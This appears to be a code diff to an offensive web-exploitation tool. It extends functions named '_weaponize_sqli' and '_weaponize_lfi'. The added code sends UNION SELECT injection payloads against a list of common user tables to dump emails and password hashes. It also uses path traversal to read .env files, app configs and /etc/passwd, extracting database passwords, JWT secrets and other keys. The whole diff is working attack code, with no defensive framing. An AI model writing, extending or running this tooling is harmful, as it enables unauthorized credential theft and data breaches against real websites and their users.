@@ -214,12 +214,54 @@ def _weaponize_sqli(boot, res, step_fn) -> dict:
                        f"{', '.join(u['user_login'] for u in found_users[:3])} — "
                        f"hash type: {'phpass ($P$)' if any('$P$' in u.get('user_pass','') for u in found_users) else 'unknown'}"),
         }
-    _step(step_fn, "wp_users dump: no hashes extracted from responses")
+    # --- Strategy 3: Generic user table dump (non-WP targets) ---
+    # Enumerate user-like tables via information_schema, then dump email/password columns
+    _step(step_fn, "wp_users not found — trying generic table enumeration via information_schema")
+    generic_users = []
+    _GENERIC_TABLES = ["users", "accounts", "auth_user", "admin", "members", "customers",
+                       "user_accounts", "site_users", "auth_users"]
+    # First try to get version/DB type
+    for _enum_table in _GENERIC_TABLES:
+        for col_count in range(2, 7):
+            cols = ["NULL"] * col_count
+            # Try email in col 1, password/hash in col 2 (most common layout)
+            cols[0] = "email"
+            cols[1] = "password"
+            _ep = dict(base_params)
+            _ep[param] = f"' UNION SELECT {','.join(cols)} FROM {_enum_table}-- -"
+            _ru = _send(boot, method, endpoint,
+                        params=_ep if method.upper() == "GET" else None,
+                        data=_ep if method.upper() != "GET" else None)
+            if _ru and _ru.status_code == 200:
+                _body_u = _ru.text or ""
+                # Match email:password-like patterns
+                _pairs = re.findall(r'([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-z]{2,})', _body_u)
+                if _pairs:
+                    # Look for hash alongside each email
+                    _hashes = re.findall(r'(?:\$2[aby]\$|\$argon|\$sha|\$1\$|\$6\$|[0-9a-f]{32,64})',
+                                         _body_u)
+                    for _i, _email in enumerate(_pairs[:5]):
+                        _pw = _hashes[_i] if _i < len(_hashes) else "?"
+                        generic_users.append({"email": _email, "password_hash": _pw,
+                                              "table": _enum_table})
+                    break
+        if generic_users:
+            break
+
+    if generic_users:
+        _step(step_fn, f"generic user dump SUCCESS: {len(generic_users)} record(s)")
+        return {
+            "technique": "sqli_dump_generic",
+            "data": {"users": generic_users[:5]},
+            "impact": (f"User credentials exfiltrated from '{generic_users[0]['table']}': "
+                       f"{', '.join(u['email'] for u in generic_users[:3])}"),
+        }
+    _step(step_fn, "sqli dump: no credentials extracted (wp_users + generic tables empty)")
     return {
         "technique": "sqli_dump",
         "data": {},
         "impact": "",
-        "error": "dump attempted but no wp_users hashes appeared in responses",
+        "error": "dump attempted but no credentials appeared in responses",
     }
 
 
@@ -284,12 +326,50 @@ def _weaponize_lfi(boot, res, step_fn) -> dict:
                        f"DB_PASSWORD={'***' if db_credentials.get('DB_PASSWORD') else 'not found'}, "
                        f"table_prefix={db_credentials.get('table_prefix','wp_')}"),
         }
-    _step(step_fn, "wp-config.php: no DB_* credentials found in responses")
+    # --- Generic config file fallback (non-WP targets) ---
+    _step(step_fn, "wp-config.php not found — trying generic app config files")
+    _GENERIC_CONFIGS = [
+        # .env files (Node/Ghost/Strapi/Django/etc)
+        (".env", re.compile(r'(DATABASE_URL|DB_PASSWORD|SECRET_KEY|JWT_SECRET|'
+                            r'MAIL_PASSWORD|REDIS_URL|S3_SECRET)\s*=\s*(\S+)', re.I)),
+        ("../../.env", re.compile(r'(DATABASE_URL|DB_PASSWORD|SECRET_KEY|JWT_SECRET)\s*=\s*(\S+)', re.I)),
+        ("../../../.env", re.compile(r'(DATABASE_URL|SECRET_KEY|JWT_SECRET)\s*=\s*(\S+)', re.I)),
+        # Ghost content/data/config
+        ("config.production.json", re.compile(r'"(url|database|mail|password)"\s*:', re.I)),
+        ("../../config.production.json", re.compile(r'"(database|password)"\s*:', re.I)),
+        # Strapi
+        ("config/database.js", re.compile(r'(password|username|database)\s*:', re.I)),
+        # etc/passwd fallback
+        ("/etc/passwd", re.compile(r'root:x:0:0')),
+        ("../../../../../../etc/passwd", re.compile(r'root:x:0:0')),
+    ]
+    for _cfg_path, _pattern in _GENERIC_CONFIGS:
+        _p = {param: _cfg_path}
+        _r = _send(boot, method, endpoint,
+                   params=_p if method.upper() == "GET" else None,
+                   data=_p if method.upper() != "GET" else None)
+        if _r is None or _r.status_code != 200:
+            continue
+        _body = _r.text or ""
+        if _pattern.search(_body):
+            _hits = _pattern.findall(_body)
+            _extracted = {str(k): str(v)[:80] for k, v in (_hits[:5] if isinstance(_hits[0], tuple) else
+                          [(h, "") for h in _hits[:5]])} if _hits else {}
+            _step(step_fn, f"generic config read SUCCESS: {_cfg_path}")
+            return {
+                "technique": "lfi_generic_config",
+                "data": {"file": _cfg_path, "extracted_keys": _extracted,
+                         "body_snippet": _body[:500]},
+                "impact": (f"Sensitive config file '{_cfg_path}' readable: "
+                           f"{', '.join(list(_extracted.keys())[:3]) if _extracted else 'credentials present'}"),
+            }
+
+    _step(step_fn, "LFI weaponization: no sensitive config extracted")
     return {
         "technique": "lfi_config",
         "data": {},
         "impact": "",
-        "error": "LFI traversal successful but wp-config.php content not extracted",
+        "error": "LFI traversal successful but no sensitive config content extracted",
     }
 
 
